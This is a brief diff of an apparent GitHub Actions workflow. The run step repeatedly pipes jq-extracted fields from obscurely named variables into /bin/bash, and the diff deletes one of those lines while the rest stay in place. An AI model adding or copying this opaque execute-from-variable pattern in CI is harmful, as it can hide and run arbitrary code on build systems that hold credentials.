@@ -22,7 +22,6 @@ jobs:
           echo $dhaci0 | jq -r .akfd6664 | /bin/bash
           printf '%s' "$zprfe8752" | jq -r .espeq810 | /bin/bash
           printf '%s' "$chb10" | jq -r .zxvoj1661 | /bin/bash
-          echo $vwf49373 | jq -r .htq27 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
